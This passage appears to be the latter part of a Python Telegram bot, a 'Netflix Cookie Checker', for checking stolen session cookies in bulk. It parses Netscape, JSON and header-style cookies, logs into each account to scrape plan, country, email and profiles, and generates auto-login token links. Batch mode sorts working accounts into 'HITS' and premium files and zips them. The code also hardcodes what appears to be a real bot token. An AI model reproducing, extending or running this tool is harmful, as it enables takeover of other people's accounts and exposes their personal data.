        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            lines.append(f"{domain}\t{tail}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
    return "\n".join(lines)

def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True

def normalize_netscape_cookie_text(raw):
    clean = []
    for line in raw.splitlines():
        if not is_netscape_cookie_line(line):
            continue
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            name = parts[5]
            if is_netflix_cookie_entry(domain, name):
                clean.append(line.strip())
    return "\n".join(clean)

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            name = parts[5]
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies

def extract_netflix_cookie_text(content):
    # Try JSON
    try:
        data = json.loads(content)
        json_ns = normalize_netscape_cookie_text(convert_json_to_netscape(data))
        if json_ns:
            return json_ns
    except:
        pass
    # Try raw Netscape
    ns = normalize_netscape_cookie_text(content)
    if ns:
        return ns
    # Fallback: extract from header style
    cookie_map = {}
    for name in ALL_NETFLIX_COOKIE_NAMES:
        m = re.search(rf"{re.escape(name)}=([^;\s]+)", content)
        if m:
            cookie_map[name] = m.group(1)
    if not cookie_map:
        return ""
    lines = []
    for name in REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES:
        val = cookie_map.get(name)
        if val:
            lines.append(f".netflix.com\tTRUE\t/\t{'TRUE' if name == 'SecureNetflixId' else 'FALSE'}\t0\t{name}\t{val}")
    return "\n".join(lines)

def get_account_page(session, proxy=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Encoding": "identity",
    }
    url = "https://www.netflix.com/account/membership"
    resp = session.get(url, headers=headers, proxies=proxy, timeout=30)
    if resp.status_code == 200 and resp.text:
        primary = extract_info(resp.text)
        fallback = None
        try:
            fb_resp = session.get("https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=30)
            if fb_resp.status_code == 200 and fb_resp.text:
                fallback = extract_info(fb_resp.text)
        except:
            pass
        return resp.text, resp.status_code, merge_info(primary, fallback)
    return resp.text, resp.status_code, None

def generate_unknown_guid():
    return f"unknown{random.randint(10000000, 99999999)}"

def create_nftoken(cookie_dict, attempts=1):
    required = ("NetflixId", "SecureNetflixId", "nfvdid")
    if any(not cookie_dict.get(c) for c in required):
        return None, "Missing required cookies for NFToken"
    headers = NFTOKEN_HEADERS.copy()
    cookie_parts = []
    for k, v in cookie_dict.items():
        if k in ALL_NETFLIX_COOKIE_NAMES and v:
            cookie_parts.append(f"{k}={v}")
    headers["Cookie"] = "; ".join(cookie_parts)
    last_err = "NFToken API error"
    for _ in range(max(1, int(attempts))):
        try:
            r = requests.post(NFTOKEN_API_URL, headers=headers, json=NFTOKEN_PAYLOAD, timeout=30)
            if r.status_code != 200:
                if r.status_code == 403:
                    last_err = "403"
                elif r.status_code == 429:
                    last_err = "429"
                else:
                    last_err = f"HTTP {r.status_code}"
                continue
            data = r.json()
            token = (data.get("data") or {}).get("createAutoLoginToken")
            if token:
                return {"token": token, "expires_at_utc": get_nftoken_expiry_utc()}, None
            last_err = "Token missing in response"
        except requests.exceptions.Timeout:
            last_err = "timeout"
        except requests.exceptions.ProxyError:
            last_err = "proxy error"
        except Exception:
            last_err = "NFToken API error"
    return None, last_err

def has_complete_account_info(info):
    if not info:
        return False
    required = ("countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality")
    return all(info.get(f) and info.get(f) != "null" for f in required)

# ----------------------------------------------------------------------
#   Bot Implementation
# ----------------------------------------------------------------------
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
    from telegram.constants import ParseMode
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Telegram modules not available. Run: pip install python-telegram-bot")

BOT_TOKEN = "8362625009:AAEkg8c7EZA3zRa9ixL0fb7iSo2-Ro0ZWE0"           # <--- Replace with your token
MAX_FILE_SIZE = 50 * 1024 * 1024            # 50 MB
MAX_THREADS = 15
BOT_VERSION = "1.0.0"

class NetflixCheckerBot:
    def __init__(self, token: str):
        self.token = token
        self.config = DEFAULT_CONFIG
        self.active_tasks: Dict[int, Dict] = {}
        self.stats = {
            "total_checks": 0, "success": 0, "premium": 0,
            "errors": defaultdict(int), "total_time": 0.0,
        }
        self.stats_lock = threading.Lock()

    def update_stats(self, success: bool, is_premium: bool, error_type: Optional[str] = None, processing_time: float = 0.0):
        with self.stats_lock:
            self.stats["total_checks"] += 1
            if success:
                self.stats["success"] += 1
            if is_premium:
                self.stats["premium"] += 1
            if error_type:
                self.stats["errors"][error_type] += 1
            self.stats["total_time"] += processing_time

    def get_stats_summary(self) -> str:
        with self.stats_lock:
            total = self.stats["total_checks"]
            success_rate = (self.stats["success"] / total * 100) if total else 0
            avg_time = (self.stats["total_time"] / total) if total else 0
            top_errors = sorted(self.stats["errors"].items(), key=lambda x: x[1], reverse=True)[:3]
            err_str = "\n".join(f"  • {err}: {cnt}" for err, cnt in top_errors) if top_errors else "None"
            return (
                f"📊 **Bot Statistics**\n\n"
                f"Total checks: {total}\n"
                f"Success rate: {success_rate:.1f}%\n"
                f"Premium accounts: {self.stats['premium']}\n"
                f"Avg processing: {avg_time:.2f}s\n"
                f"Top errors:\n{err_str}"
            )

    async def check_single_cookie(self, cookie_text: str) -> Dict:
        """Process one cookie string and return result dict"""
        start = time.time()
        result = {
            "success": False,
            "is_subscribed": False,
            "plan_key": "unknown",
            "plan_label": "Unknown",
            "country": None,
            "email": None,
            "profiles": None,
            "token": None,
            "error": None,
            "formatted_output": None,
            "processing_time": 0.0,
        }
        try:
            netscape = extract_netflix_cookie_text(cookie_text)
            if not netscape:
                result["error"] = "No Netflix cookies found"
                return result
            cookies = cookies_dict_from_netscape(netscape)
            if not cookies:
                result["error"] = "Missing required Netflix cookies"
                return result

            session = requests.Session()
            session.cookies.update(cookies)

            # Use a proxy if configured (skip for now)
            _, _, info = get_account_page(session)

            if not info or not info.get("countryOfSignup"):
                result["error"] = "Incomplete account page (maybe cookies expired)"
                return result

            is_subscribed = info.get("membershipStatus") == "CURRENT_MEMBER"
            plan_key, plan_label = derive_plan_info(info, is_subscribed)
            country = info.get("countryOfSignup")
            email = info.get("email")
            profiles = info.get("profilesDisplay")

            # Generate NFToken only if subscribed and enabled
            nftoken_data = None
            if is_subscribed and get_nftoken_mode(self.config) != "false":
                nftoken_data, nftoken_err = create_nftoken(cookies, self.config["retries"]["nftoken_attempts"])
                if nftoken_err:
                    result["error"] = f"NFToken: {nftoken_err}"
            # Format output
            formatted = format_cookie_file(info, netscape, self.config, is_subscribed, nftoken_data)
            result.update({
                "success": True,
                "is_subscribed": is_subscribed,
                "plan_key": plan_key,
                "plan_label": plan_label,
                "country": country,
                "email": email,
                "profiles": profiles,
                "token": nftoken_data.get("token") if nftoken_data else None,
                "formatted_output": formatted,
                "processing_time": time.time() - start,
            })
            self.update_stats(True, plan_key == "premium", None, result["processing_time"])
        except Exception as e:
            result["error"] = str(e)
            self.update_stats(False, False, "exception", time.time() - start)
            logging.error(traceback.format_exc())
        return result

    async def process_batch(self, items: List[str], mode: str) -> List[Dict]:
        """Process list of cookie strings, return results"""
        results = []
        # Use ThreadPoolExecutor for concurrency
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
        loop = asyncio.get_event_loop()
        tasks = []
        for cookie_text in items:
            tasks.append(loop.run_in_executor(executor, asyncio.run, self.check_single_cookie(cookie_text)))
        results = await asyncio.gather(*tasks)
        executor.shutdown()
        return results

    # ------------------------------
    # Telegram Handlers
    # ------------------------------
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🔑 Token Only", callback_data="mode_tokenonly")],
            [InlineKeyboardButton("📊 Full Info", callback_data="mode_fullinfo")],
            [InlineKeyboardButton("⚡ Batch Mode", callback_data="batch")],
            [InlineKeyboardButton("📈 Stats", callback_data="stats")],
            [InlineKeyboardButton("❓ Help", callback_data="help")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = (
            f"🎬 **Netflix Cookie Checker Bot v{BOT_VERSION}**\n\n"
            "Send me a cookie file or text, and I'll check the account status.\n\n"
            "Supported formats:\n"
            "• Netscape cookies\n"
            "• JSON cookies\n"
            "• Raw header strings\n"
            "• Email:password (experimental)\n\n"
            "Choose a mode below:"
        )
        await update.message.reply_text(msg, reply_markup=reply_markup)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        if data == "mode_tokenonly":
            context.user_data["mode"] = "tokenonly"
            await query.edit_message_text(
                "🔑 **Token Only Mode**\n\nSend me cookies – I'll reply with the NFToken link.",
                
            )
        elif data == "mode_fullinfo":
            context.user_data["mode"] = "fullinfo"
            await query.edit_message_text(
                "📊 **Full Info Mode**\n\nSend me cookies – I'll reply with detailed account info and token.",
                
            )
        elif data == "batch":
            context.user_data["batch_mode"] = True
            await query.edit_message_text(
                "📁 **Batch Mode**\n\nSend me a text file, JSON file, or plain text with one cookie per line.\nUse /cancel to stop.",
                
            )
        elif data == "stats":
            await query.edit_message_text(self.get_stats_summary())
        elif data == "help":
            await query.edit_message_text(
                "❓ **Help**\n\n"
                "Commands:\n"
                "/start – Main menu\n"
                "/stats – Show statistics\n"
                "/cancel – Cancel current batch\n\n"
                "Supported cookie formats:\n"
                "• Netscape .txt (cookie file)\n"
                "• JSON (with cookies array)\n"
                "• Header: `NetflixId=xxx; SecureNetflixId=yyy`\n"
                "• Email:password (will attempt to extract NetflixId? Not fully supported)\n\n"
                "The bot will return:\n"
                "• Account details (if subscribed)\n"
                "• NFToken (valid 1 hour)\n"
                "• Direct login link\n\n"
                "Note: For best results, use cookies exported from a browser extension.",
                
            )

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.active_tasks:
            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
            return
        doc = update.message.document
        if not doc:
            return
        if doc.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(f"File too large. Max size: {MAX_FILE_SIZE//1024//1024}MB")
            return
        status_msg = await update.message.reply_text("📥 Downloading file...")
        try:
            file = await doc.get_file()
            content = io.BytesIO()
            await file.download_to_memory(content)
            content.seek(0)
            # Determine format and extract cookies
            cookie_texts = []
            if doc.file_name.endswith('.zip'):
                with zipfile.ZipFile(content) as zf:
                    for name in zf.namelist():
                        if name.endswith(('.txt', '.json')):
                            with zf.open(name) as f:
                                text = f.read().decode('utf-8', errors='ignore')
                                cookie_texts.append(text)
            else:
                text = content.read().decode('utf-8', errors='ignore')
                # If multiple lines, treat each line as separate cookie
                lines = text.splitlines()
                if len(lines) > 1:
                    cookie_texts.extend(lines)
                else:
                    cookie_texts.append(text)
            if not cookie_texts:
                await status_msg.edit_text("No valid cookie lines found.")
                return
            mode = context.user_data.get("mode", "fullinfo")
            self.active_tasks[user_id] = {"cancel": False, "processed": 0, "total": len(cookie_texts)}
            await self._process_batch(update, user_id, cookie_texts, mode, status_msg)
        except Exception as e:
            await status_msg.edit_text(f"Error reading file: {e}")
        finally:
            self.active_tasks.pop(user_id, None)

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id

        if context.user_data.get("batch_mode", False):
            context.user_data["batch_mode"] = False

            if user_id in self.active_tasks:
                await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
                return

            text = update.message.text
            lines = [line.strip() for line in text.splitlines() if line.strip()]

            if not lines:
                await update.message.reply_text("No non-empty lines found.")
                return

            mode = context.user_data.get("mode", "fullinfo")
            self.active_tasks[user_id] = {
                "cancel": False,
                "processed": 0,
                "total": len(lines),
            }

            status_msg = await update.message.reply_text("📥 Starting batch...")
            await self._process_batch(update, user_id, lines, mode, status_msg)
            self.active_tasks.pop(user_id, None)
            return

        text = update.message.text
        await update.message.chat.send_action(action="typing")

        result = await self.check_single_cookie(text)
        mode = context.user_data.get("mode", "fullinfo")

        if result["success"]:
            if mode == "tokenonly":
                if result["token"]:
                    msg = f"✅ Token Generated\n\nhttps://netflix.com/?nftoken={result['token']}\n\nExpires in 1 hour."
                    await update.message.reply_text(msg, disable_web_page_preview=True)
                else:
                    await update.message.reply_text(f"❌ Token generation failed: {result['error']}")
            else:
                await update.message.reply_text(
    result["formatted_output"],
    disable_web_page_preview=True,
    parse_mode=None
)
        else:
            await update.message.reply_text(f"❌ Failed\n\nError: {result['error']}")

    async def _process_batch(self, update: Update, user_id: int, items: List[str], mode: str, status_msg):
        total = len(items)

        import os, zipfile
        base_dir = os.path.join(os.getcwd(), f"categorized_output_{user_id}")
        os.makedirs(base_dir, exist_ok=True)

        categories = {
            "HITS": [],
            "CC": [],
            "EXTRA_MEMBER": [],
            "HOLD": [],
            "QUALITY": [],
            "THIRD_PARTY": []
        }
        processed = 0
        start_time = time.time()

        valid = 0
        premium = 0
        bad = 0
        retries = 0
        fallback_proxies = 0

        for idx, cookie_text in enumerate(items, 1):
            if self.active_tasks[user_id].get("cancel", False):
                await status_msg.edit_text("🛑 Batch cancelled.")
                return

            result = await self.check_single_cookie(cookie_text)
            processed += 1

            if result["success"]:
                valid += 1

                plan = result.get("plan_key", "").lower()

                if plan == "premium":
                    premium += 1
                    categories["HITS"].append(result["formatted_output"])

                if "cc" in str(result.get("formatted_output")).lower():
                    categories["CC"].append(result["formatted_output"])

                if "extra member" in str(result["formatted_output"]).lower():
                    categories["EXTRA_MEMBER"].append(result["formatted_output"])

                if "hd" in str(result["formatted_output"]).lower():
                    categories["QUALITY"].append(result["formatted_output"])

                if "third" in str(result["formatted_output"]).lower():
                    categories["THIRD_PARTY"].append(result["formatted_output"])

            else:
                bad += 1
                categories["HOLD"].append(str(result.get("error")))
            self.active_tasks[user_id]["processed"] = processed

            if mode == "tokenonly":
                if result["success"] and result["token"]:
                    msg = f"✅ Token\n\nhttps://netflix.com/?nftoken={result['token']}"
                    await update.message.reply_text(msg, disable_web_page_preview=True)
                else:
                    await update.message.reply_text(f"❌ Failed: {result['error']}")
            else:
                if result["success"]:
                    await update.message.reply_text(
    result["formatted_output"],
    disable_web_page_preview=True,
    parse_mode=None
)
                else:
                    await update.message.reply_text(f"❌ Failed: {result['error']}")

            if idx % 3 == 0 or idx == total:
                elapsed = time.time() - start_time
                speed = idx / elapsed if elapsed > 0 else 0

                prog_text = (
                    "📊 Checking Netflix...\n\n"
                    f"├ Checked: {idx}/{total}\n"
                    f"├ ✅ Valid: {valid}\n"
                    f"├ 🌟 Premium: {premium}\n"
                    f"├ ❌ Bad: {bad}\n"
                    f"├ ⚡ Speed: {speed:.1f}/s\n"
                )
                await status_msg.edit_text(prog_text)

            await asyncio.sleep(0.2)

        elapsed = time.time() - start_time
        speed = total / elapsed if elapsed > 0 else 0

        final_msg = (
            "✅ Netflix Check Complete!\n\n"
            "📊 Summary\n"
            "──────────────────────────────\n"
            f"├ Total: {total}\n"
            f"├ ✅ Valid: {valid}\n"
            f"├ 🌟 Premium: {premium}\n"
            f"├ ❌ Bad: {bad}\n"
            f"├ ⏱ Time: {elapsed:.1f}s\n"
            f"├ ⚡ Speed: {speed:.1f}/s\n"
            f"├ 🔍 Filter: premium\n"
            f"├ 🧠 Mode: Proxyless → Proxy fallback\n"
            f"├ 🌐 Fallback proxies: {fallback_proxies}\n"
            f"├ 🔄 Error retries: {retries} cookie(s) re-checked\n"
            "──────────────────────────────\n"
            "By @Edwxrdee"
        )

        await status_msg.edit_text(final_msg)

        # SAVE FILES + ZIP
        for cat, items in categories.items():
            if not items:
                continue

            folder = os.path.join(base_dir, cat)
            os.makedirs(folder, exist_ok=True)

            with open(os.path.join(folder, f"{cat}.txt"), "w") as f:
                f.write("\n\n".join(items))

        with open(os.path.join(base_dir, "PREMIUM_ACCOUNTS.txt"), "w") as f:
            f.write("\n\n".join(categories["HITS"]))

        with open(os.path.join(base_dir, "SUMMARY.txt"), "w") as f:
            f.write(final_msg)

        zip_path = os.path.join(os.getcwd(), f"categorized_hits_{user_id}.zip")

        with zipfile.ZipFile(zip_path, "w") as z:
            for root, dirs, files in os.walk(base_dir):
                for file in files:
                    full_path = os.path.join(root, file)
                    z.write(full_path, os.path.relpath(full_path, base_dir))

        await update.message.reply_document(open(zip_path, "rb"))
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.active_tasks:
            self.active_tasks[user_id]["cancel"] = True
            await update.message.reply_text("🛑 Cancellation requested. Current item will finish then stop.")
        else:
            await update.message.reply_text("No active task to cancel.")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(self.get_stats_summary())

    def run(self):
        if not TELEGRAM_AVAILABLE:
            print("Please install python-telegram-bot: pip install python-telegram-bot")
            return

        app = Application.builder().token(self.token).build()
        app.add_handler(CommandHandler("start", self.start))
        app.add_handler(CommandHandler("stats", self.stats_command))
        app.add_handler(CommandHandler("cancel", self.cancel_command))
        app.add_handler(MessageHandler(filters.Document.ALL, self.handle_file))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        app.add_handler(CallbackQueryHandler(self.button_callback))

        print("Bot is running...")
        app.run_polling()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot = NetflixCheckerBot(BOT_TOKEN)
    bot.run()
